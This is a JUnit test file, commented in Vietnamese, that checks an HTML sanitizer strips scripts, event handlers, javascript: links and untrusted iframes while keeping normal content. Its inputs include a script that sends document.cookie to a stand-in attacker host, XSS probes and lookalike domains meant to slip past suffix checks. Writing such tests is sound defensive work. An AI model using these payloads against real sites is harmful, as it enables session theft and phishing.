package com.songnhue.core.common.util;

import static org.assertj.core.api.Assertions.assertThat;

import org.junit.jupiter.api.DisplayName;
import org.junit.jupiter.api.Test;

/**
 * Khử trùng HTML của nội dung — WS-16.
 *
 * <p><b>Mỗi bài khẳng định cả hai vế</b>: phần chạy được đã mất <i>và</i> nội dung hiển thị còn.
 * Chỉ kiểm vế đầu thì một hàm trả chuỗi rỗng cũng xanh trọn vẹn — bài học từ {@code SvgSanitizer}
 * ở WS-14.
 */
class HtmlSanitizerTest {

    @Test
    @DisplayName("⛔ Thẻ <script> bị gỡ, phần bài viết còn nguyên")
    void goThescript() {
        String sach = HtmlSanitizer.clean(
                "<p>Thông báo xả lũ</p><script>fetch('https://ke-tan-cong.example?c='+document.cookie)</script>");

        assertThat(sach).doesNotContain("<script").doesNotContain("document.cookie");
        assertThat(sach).contains("Thông báo xả lũ");
    }

    @Test
    @DisplayName("⛔ Thuộc tính bắt sự kiện bị gỡ, thẻ mang nó vẫn còn")
    void goThuocTinhBatSuKien() {
        String sach = HtmlSanitizer.clean("<p onclick=\"alert(1)\">Nội dung quan trọng</p>");

        assertThat(sach).doesNotContain("onclick");
        assertThat(sach).contains("Nội dung quan trọng");
    }

    @Test
    @DisplayName("⛔ Liên kết javascript: bị gỡ, chữ của liên kết vẫn đọc được")
    void goLienKetJavascript() {
        String sach = HtmlSanitizer.clean("<a href=\"javascript:alert(1)\">Bấm vào đây</a>");

        assertThat(sach).doesNotContain("javascript:");
        assertThat(sach).contains("Bấm vào đây");
    }

    @Test
    @DisplayName("⛔ <iframe> lạ trong nội dung bài viết bị gỡ")
    void goIframeTrongBaiViet() {
        String sach = HtmlSanitizer.clean("<p>Xem thêm</p><iframe src=\"https://trang-la.example\"></iframe>");

        assertThat(sach).doesNotContain("<iframe");
        assertThat(sach).contains("Xem thêm");
    }

    @Test
    @DisplayName("Định dạng bình thường của trình soạn thảo đi qua nguyên vẹn")
    void giuDinhDangBinhThuong() {
        String goc = "<h2>Tiến độ</h2><p>Đã hoàn thành <strong>80%</strong>.</p>"
                + "<ul><li>Trạm bơm Yên Nghĩa</li></ul>"
                + "<figure><img src=\"https://cong.example/anh.png\"><figcaption>Toàn cảnh</figcaption></figure>";

        String sach = HtmlSanitizer.clean(goc);

        assertThat(sach)
                .contains("<h2>")
                .contains("<strong>")
                .contains("<li>")
                .contains("<figcaption>")
                .contains("anh.png");
    }

    @Test
    @DisplayName("⭐⭐ Ảnh chèn giữa bài dùng đường dẫn TƯƠNG ĐỐI phải sống sót")
    void giuDuongDanTuongDoiCuaAnh() {
        String sach = HtmlSanitizer.clean(
                "<p>Hiện trạng:</p><img src=\"/api/v1/public/files/11111111-2222-3333-4444-555555555555\">");

        assertThat(sach)
                .as(
                        """
                        jsoup mặc định gỡ thuộc tính không khớp giao thức cho phép, mà ảnh trong bài trỏ \
                        tới đường dẫn tương đối — thiếu preserveRelativeLinks thì MỌI ảnh trong MỌI bài \
                        biến mất lặng lẽ ngay lượt lưu kế tiếp.""")
                .contains("/api/v1/public/files/11111111-2222-3333-4444-555555555555");
    }

    @Test
    @DisplayName("⛔ Giữ đường dẫn tương đối KHÔNG mở lại lỗ javascript:")
    void giuTuongDoiVanChanJavascript() {
        assertThat(HtmlSanitizer.clean("<a href=\"javascript:alert(1)\">x</a>")).doesNotContain("javascript:");
        assertThat(HtmlSanitizer.clean("<img src=\"javascript:alert(1)\">")).doesNotContain("javascript:");
    }

    @Test
    @DisplayName("⭐ Nhúng bản đồ Google đi qua; iframe trỏ máy chủ khác bị gỡ SẠCH")
    void chiNhanNhungBanDoGoogle() {
        String hopLe = HtmlSanitizer.cleanMapEmbed(
                "<iframe src=\"https://www.google.com/maps/embed?pb=abc\" width=\"600\"></iframe>");
        String khongHopLe =
                HtmlSanitizer.cleanMapEmbed("<iframe src=\"https://trang-gia-mao.example/dang-nhap\"></iframe>");

        assertThat(hopLe).contains("google.com/maps/embed");
        assertThat(khongHopLe)
                .as(
                        """
                        Trang trong iframe không đọc được nội dung trang cha, nhưng nó vẽ được một biểu mẫu \
                        đăng nhập giả ngay giữa chân trang của cơ quan nhà nước — người dùng không có cách \
                        nào phân biệt.""")
                .doesNotContain("iframe");
    }

    @Test
    @DisplayName("⛔ Tên miền chỉ CHỨA chuỗi cho phép thì không được nhận — bẫy so khớp hậu tố")
    void khongNhanTenMienGiaMao() {
        assertThat(HtmlSanitizer.cleanMapEmbed("<iframe src=\"https://evilgoogle.com/maps\"></iframe>"))
                .as("so khớp phải là hậu tố CÓ DẤU CHẤM, nếu không thì đăng ký `evilgoogle.com` là qua được")
                .doesNotContain("iframe");
        assertThat(HtmlSanitizer.cleanMapEmbed("<iframe src=\"https://maps.google.com/x\"></iframe>"))
                .as("nhưng tên miền con thật thì vẫn phải nhận")
                .contains("iframe");
    }

    @Test
    @DisplayName("Bộ dò tự kiểm — chứng minh nó bắt được thứ nó nói là bắt")
    void botDoBatDuocThat() {
        assertThat(HtmlSanitizer.coMaChayDuoc("<p onload=\"x\">a</p>")).isTrue();
        assertThat(HtmlSanitizer.coMaChayDuoc("<script>x</script>")).isTrue();
        assertThat(HtmlSanitizer.coMaChayDuoc("<a href=\"javascript:x\">a</a>")).isTrue();
        assertThat(HtmlSanitizer.coMaChayDuoc("<p>Nội dung sạch</p>")).isFalse();
    }

    @Test
    @DisplayName("Không có nội dung thì trả nguyên trạng — 'chưa nhập' khác 'nhập chuỗi rỗng'")
    void giuNguyenGiaTriRong() {
        assertThat(HtmlSanitizer.clean(null)).isNull();
        assertThat(HtmlSanitizer.clean("")).isEmpty();
        assertThat(HtmlSanitizer.cleanMapEmbed(null)).isNull();
    }

    @Test
    @DisplayName("toPlainText bóc hết thẻ — dùng cho thẻ mô tả SEO")
    void bocHetTheChoSeo() {
        assertThat(HtmlSanitizer.toPlainText("<p>Thông báo <strong>khẩn</strong></p>"))
                .isEqualTo("Thông báo khẩn");
    }

    // ---- Video nhúng — CN-01.1 ----------------------------------------------

    @Test
    @DisplayName("⭐ Video YouTube/Vimeo nhúng được — CN-01.1 yêu cầu, trước WS-20 thì bị gỡ im lặng")
    void nhanVideoTuMienDaBiet() {
        String sach = HtmlSanitizer.clean("<p>Xem clip:</p>"
                + "<iframe src=\"https://www.youtube-nocookie.com/embed/abc123\" allowfullscreen></iframe>"
                + "<iframe src=\"https://player.vimeo.com/video/987\"></iframe>");

        assertThat(sach).contains("youtube-nocookie.com/embed/abc123");
        assertThat(sach).contains("player.vimeo.com/video/987");
        assertThat(sach).as("phần chữ quanh video phải còn").contains("Xem clip");
    }

    @Test
    @DisplayName("⛔ Iframe trỏ ra máy chủ lạ bị gỡ, dù đúng giao thức https")
    void goIframeMienLa() {
        String sach = HtmlSanitizer.clean(
                "<p>Trước</p><iframe src=\"https://ke-tan-cong.example/dang-nhap-gia\"></iframe><p>Sau</p>");

        assertThat(sach).doesNotContain("ke-tan-cong.example");
        assertThat(sach).doesNotContain("<iframe");
        assertThat(sach).contains("Trước").contains("Sau");
    }

    @Test
    @DisplayName("⛔ Tên miền giả dạng hậu tố không lọt — `evilyoutube.com` khác `youtube.com`")
    void goMienGiaDang() {
        assertThat(HtmlSanitizer.clean("<iframe src=\"https://evilyoutube.com/embed/x\"></iframe>"))
                .doesNotContain("evilyoutube");
        assertThat(HtmlSanitizer.clean("<iframe src=\"https://player.vimeo.com.kegian.net/x\"></iframe>"))
                .doesNotContain("kegian");
    }

    @Test
    @DisplayName("Nhúng bản đồ vẫn chỉ nhận máy chủ bản đồ — hai danh sách không lẫn vào nhau")
    void haiDanhSachMienKhongLanNhau() {
        assertThat(HtmlSanitizer.cleanMapEmbed("<iframe src=\"https://www.youtube.com/embed/x\"></iframe>"))
                .as("khối bản đồ ở chân trang không phải chỗ để nhúng video")
                .doesNotContain("youtube");
        assertThat(HtmlSanitizer.clean("<iframe src=\"https://maps.google.com/maps?q=1\"></iframe>"))
                .as("và ngược lại — nội dung bài không phải chỗ nhúng bản đồ")
                .doesNotContain("maps.google.com");
    }

    // ---- Bảng — WS-41 ------------------------------------------------------
    //
    // ⚠⚠ MỌI mảnh bảng dưới đây bọc trong `<table>` + `<colgroup>`/`<tbody>` đầy đủ, và mỗi bài
    // chốt `contains("<table")` TRƯỚC các khẳng định phủ định. Lý do đã đo: một `<col>` hay `<td>`
    // đứng lạc ngoài ngữ cảnh bảng bị **bộ phân tích HTML bỏ hẳn**, `clean()` trả về CHUỖI RỖNG,
    // và khi ấy mọi `doesNotContain(...)` đều xanh — một bài kiểm chứng minh số không.

    @Test
    @DisplayName("⭐⭐ `colspan`/`rowspan` sống sót — ô gộp mất chúng là bảng vỡ cấu trúc")
    void giuColspanRowspan() {
        String sach = HtmlSanitizer.clean(
                """
                <table><colgroup><col><col></colgroup><tbody>\
                <tr><th colspan="2">Cụm cống Liên Mạc</th></tr>\
                <tr><td rowspan="2">Đang vận hành</td><td>+2,45</td></tr>\
                </tbody></table>""");

        assertThat(sach)
                .as("bảng phải còn — nếu rỗng thì mọi khẳng định dưới đây vô nghĩa")
                .contains("<table");
        assertThat(sach).contains("colspan=\"2\"").contains("rowspan=\"2\"");
        assertThat(sach)
                .as("và chữ trong ô không mất")
                .contains("Cụm cống Liên Mạc")
                .contains("+2,45");
    }

    @Test
    @DisplayName("⛔ `style` bị gỡ khỏi bảng và `<col>`, nhưng hai thẻ ấy thì CÒN")
    void goStyleTrenBangVaCol() {
        String sach = HtmlSanitizer.clean(
                """
                <table style="min-width: 100px"><colgroup><col style="min-width: 25px"></colgroup>\
                <tbody><tr><td>Ô</td></tr></tbody></table>""");

        assertThat(sach).contains("<table").contains("<col").contains("Ô");
        assertThat(sach)
                .as("`style` là đường TipTap dùng để mang bề rộng cột — nó bị gỡ, và đó là chủ đích (T41.14)")
                .doesNotContain("style=");
    }

    @Test
    @DisplayName("⛔ Thuộc tính bắt sự kiện trên `<col>` bị gỡ, thẻ và `width` thì giữ")
    void goSuKienTrenCol() {
        String sach = HtmlSanitizer.clean(
                """
                <table><colgroup><col width="300" onload="alert(1)"></colgroup>\
                <tbody><tr><td>Ô</td></tr></tbody></table>""");

        assertThat(sach).contains("<table").contains("<col");
        assertThat(sach).doesNotContain("onload");
        assertThat(HtmlSanitizer.coMaChayDuoc(sach))
                .as("bộ dò của chính lớp này cũng phải nói là sạch")
                .isFalse();
        // `width` trên `<col>` nằm sẵn trong `Safelist.relaxed()` (đo bằng `javap -c` trên jsoup
        // 1.23.1). Ghi nhận ở đây vì nó là **nửa GHI** của đường bề rộng cột: ngày nào mở lại
        // T41.14 thì đây là đường đi, và nó KHÔNG đòi sửa Safelist.
        assertThat(sach)
                .as("`col[width]` đi qua sẵn — nửa GHI của T41.14 đã có đường")
                .contains("width=\"300\"");
    }
}
